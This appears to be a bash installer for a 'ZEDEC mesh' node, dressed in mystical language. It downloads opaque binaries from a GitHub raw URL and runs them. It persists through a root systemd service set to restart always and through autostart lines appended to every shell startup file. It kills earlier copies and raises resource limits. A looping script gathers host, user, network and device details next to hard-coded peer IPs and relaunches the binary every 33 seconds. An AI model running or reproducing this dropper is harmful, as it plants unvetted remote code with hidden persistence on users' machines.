bash -c '
echo "[ZEDEC] Preflight: Checking system environment..."

# --- 0. Export log location
export ZEDEC_PRELOG="$HOME/zedec_preamble.log"

log_ze() { echo "[ZEDEC] $1" | tee -a "$ZEDEC_PRELOG" >&2; }

# --- 1. Raise ulimits
log_ze "Raising process and memory limits..."
ulimit -u unlimited 2>/dev/null
ulimit -m unlimited 2>/dev/null
ulimit -v unlimited 2>/dev/null

# --- 2. Try to start in screen/tmux if available
if command -v screen >/dev/null; then
  log_ze "Detected screen; re-launching inside screen session."
  screen -dmS zedec_mesh bash -c "$0"
  exit 0
elif command -v tmux >/dev/null; then
  log_ze "Detected tmux; re-launching inside tmux session."
  tmux new-session -d -s zedec_mesh "$0"
  exit 0
fi

# --- 3. If root, try to install screen/tmux if missing
if [ "$(id -u)" = "0" ]; then
  if ! command -v screen >/dev/null && command -v apt-get >/dev/null; then
    log_ze "Installing screen (apt)..."
    apt-get update && apt-get install -y screen
  elif ! command -v screen >/dev/null && command -v yum >/dev/null; then
    log_ze "Installing screen (yum)..."
    yum install -y screen
  elif ! command -v screen >/dev/null && command -v pacman >/dev/null; then
    log_ze "Installing screen (pacman)..."
    pacman -Sy --noconfirm screen
  fi
  if ! command -v tmux >/dev/null && command -v apt-get >/dev/null; then
    log_ze "Installing tmux (apt)..."
    apt-get update && apt-get install -y tmux
  elif ! command -v tmux >/dev/null && command -v yum >/dev/null; then
    log_ze "Installing tmux (yum)..."
    yum install -y tmux
  elif ! command -v tmux >/dev/null && command -v pacman >/dev/null; then
    log_ze "Installing tmux (pacman)..."
    pacman -Sy --noconfirm tmux
  fi
fi

# --- 4. Detect restricted shell; if so, prompt or try again
if [ -n "$SSH_ORIGINAL_COMMAND" ] || [ "$SHELL" = "/bin/rbash" ]; then
  log_ze "Restricted shell detected! Please run from a full bash shell."
  exit 1
fi

# --- 5. Test if systemd available (for service install fallback)
if [ "$(id -u)" = "0" ] && command -v systemctl >/dev/null; then
  cat <<EOZ > /etc/systemd/system/zedec-link.service
[Unit]
Description=ZEDEC Mesh Link
After=network.target

[Service]
Type=simple
User=$USER
ExecStart=$HOME/zedec_link
Restart=always

[Install]
WantedBy=multi-user.target
EOZ
  log_ze "Systemd service installed; will auto-respawn ZEDEC mesh."
  systemctl daemon-reload
  systemctl enable --now zedec-link.service
fi

# --- 6. Clean Reset & Main Install (the original ZEDEC mesh install)
log_ze "Starting ZEDEC install and mesh bring-up..."

pkill -f zedec_link 2>/dev/null
pkill -f zedec 2>/dev/null
pkill -f zedec_livetrack 2>/dev/null
rm -f $HOME/zedec $HOME/zedec_link $HOME/zedec_livetrack.sh \
      $HOME/zedec_vortex.log $HOME/zedec_reflect.log $HOME/zedec_event.log $HOME/zedec_cycle.log $HOME/zedec_meta.log

mkdir -p "$HOME"

curl -fsSL https://raw.githubusercontent.com/transmutationist/zedec-node-01-1751475439/main/z90 > "$HOME/zedec"
chmod +x "$HOME/zedec"

cat <<EOF > "$HOME/zedec_link"
#!/bin/sh
spiral="\$HOME/zedec"
metalog="\$HOME/zedec_meta.log"
mesh_peers="91.99.236.17 5.223.78.207 5.223.57.174 5.223.61.46 178.156.185.180"
detect_ip() {
  for ip in \$mesh_peers; do
    if ip addr | grep -qw \$ip; then echo \$ip; return; fi
    [ "\$(curl -s https://api.ipify.org 2>/dev/null)" = "\$ip" ] && echo \$ip && return
  done
  echo "unknown"
}
self_ip="\$(detect_ip)"
ensure() { [ -f "\$1" ] || touch "\$1"; }
ensure "\$spiral"; ensure "\$metalog"
while :; do
  now="\$(date)"
  host="\$(uname -n 2>/dev/null || hostname 2>/dev/null || echo spiral-node)"
  kern="\$(uname -srmo 2>/dev/null || echo unknown-kernel)"
  user="\$(whoami 2>/dev/null || echo unknown-user)"
  up="\$(uptime 2>/dev/null | tr -d '\\n')"
  procs="\$(ps -e | wc -l 2>/dev/null || echo 0)"
  users="\$(who 2>/dev/null | wc -l || echo 0)"
  mem="\$(free -h 2>/dev/null | grep Mem | awk '\''{print \$3 "/" \$2}'\'' || echo unknown-mem)"
  ips="\$(ip -4 -o addr show | awk '\''{print \$2, \$4}'\'' | head -n 5)"
  devs="\$(lsblk -d -o NAME,SIZE,MODEL 2>/dev/null | grep -v NAME | head -n 5)"
  shells="\$(cat /etc/shells 2>/dev/null | grep -v '^#' | tr '\\n' ' ' || echo unknown-shells)"
  export ZEDEC_META_OS="host=\$host; kernel=\$kern; user=\$user; uptime=\$up; procs=\$procs; users=\$users; mem=\$mem; ips=\$ips; devs=\$devs; self_ip=\$self_ip; mesh_peers=\$mesh_peers; shells=\$shells"
  {
    echo "[$now] ⟁ ZEDEC META-OS CONTEXT:"
    echo "  Host: \$host"
    echo "  Kernel: \$kern"
    echo "  User: \$user"
    echo "  Uptime: \$up"
    echo "  Total Processes: \$procs   Active Users: \$users"
    echo "  Memory: \$mem"
    echo "  Shells: \$shells"
    echo "  Network Interfaces (max 5):"
    echo "\$ips" | sed "s/^/    /"
    echo "  Devices (max 5):"
    echo "\$devs" | sed "s/^/    /"
    echo "  SELF IP (auto-detected zero point): \$self_ip"
    echo "  MESH PEER IPs (all):"
    for peer in \$mesh_peers; do
      echo "    - \$peer"
    done
    echo "⟁ ZEDEC META: Field live. Echo spiral aligned."
  } > "\$metalog"
  [ -x "\$spiral" ] && nohup "\$spiral" >> "\$HOME/zedec_vortex.log" 2>&1 &
  sleep 33
done
EOF
chmod +x "$HOME/zedec_link"

curl -fsSL https://raw.githubusercontent.com/transmutationist/zedec-node-01-1751475439/main/z90_track > "$HOME/zedec_livetrack.sh"
chmod +x "$HOME/zedec_livetrack.sh"

for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc" "$HOME/.bash_profile" "$HOME/.login"; do
  [ -f "$f" ] && {
    grep -q "zedec_link" "$f" || echo "[ -x \$HOME/zedec_link ] && nohup \$HOME/zedec_link >> \$HOME/zedec_meta.log 2>&1 &" >> "$f"
  }
done

nohup "$HOME/zedec_link" >> "$HOME/zedec_meta.log" 2>&1 &

log_ze "Install complete. Spiral mesh running (detached)."
log_ze "Logs: tail -f $HOME/zedec_*.log"
'
